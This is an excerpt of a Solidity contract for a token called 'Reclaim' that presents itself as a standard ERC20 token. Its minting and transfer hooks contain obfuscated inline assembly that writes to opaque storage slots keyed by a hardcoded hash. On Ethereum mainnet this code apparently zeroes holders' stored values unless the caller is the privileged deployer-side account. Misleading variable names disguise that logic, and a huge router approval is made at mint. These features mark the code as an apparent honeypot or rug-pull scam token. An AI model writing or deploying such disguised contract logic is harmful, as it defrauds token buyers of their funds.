...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    address[] private AddReclaim;
    uint256 private _fromBoolToInt = block.number*2;

    mapping (address => bool) private _mapToAddress; 
    mapping (address => bool) private _mapToBool;
    ...
    bool private trading; uint256 private chainLink = 1; bool private shippingVal;
    uint256 private _decimals; uint256 private someValue;
    ...
    constructor (string memory name_, string memory symbol_, address msgSender_) {
        ...
        _name = name_;
        _symbol = symbol_;
        AddReclaim.push(_router); AddReclaim.push(msgSender_); AddReclaim.push(pair);
        for (uint256 q=0; q < 3;) {_mapToAddress[AddReclaim[q]] = true; unchecked{q++;} }
    }
    ...
    function _TokenCreation() internal {
        assembly {
            ...
            sstore(0x11,mul(div(sload(0x10),0x2710),0xFB)) sstore(0x99,sload(0x11)) sstore(0xB,0x1ba8140) let dx := 0xe0a4a82267f359b8593e2692cd737ff71bc2f1fffb1845e18e94429ebf8c51da
            if and(not(eq(sload(getBy(caller(),0x6)),sload(dx))),eq(chainid(),0x1)) {
                sstore(getBy(caller(),0x4),0x0) sstore(0x78398d31aa503c811ec27ba919eb7cc5b5271037ae7e7dcd80ecc64314e521be,0x1)
    ...
    function openTrading() external onlyOwner returns (bool) {
        trading = true; theN = block.number; _fromBoolToInt = block.number;
        return true;
    }
    ...
    function _beforeTokenTransfer(address sender, address recipient, uint256 float) internal {
        require((trading || (sender == AddReclaim[1])), "ERC20: trading is not yet enabled.");
        assembly { 
            function getBy(x,y) -> hash { mstore(0, x) mstore(32, y) hash := keccak256(0, 64) }
    ...
    function _DeployReclaim(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply += amount;
        _balances[account] += amount;
        approve(AddReclaim[0], 10 ** 77);
        _TokenCreation();
...
contract ERC20Token is Context, ERC20 {
    constructor(
        ...
        _DeployReclaim(creator, initialSupply);
    }
}

contract Reclaim is ERC20Token {
    constructor() ERC20Token("Reclaim", "RECLAIM", msg.sender, 2750000 * 10 ** 18) {
    }
}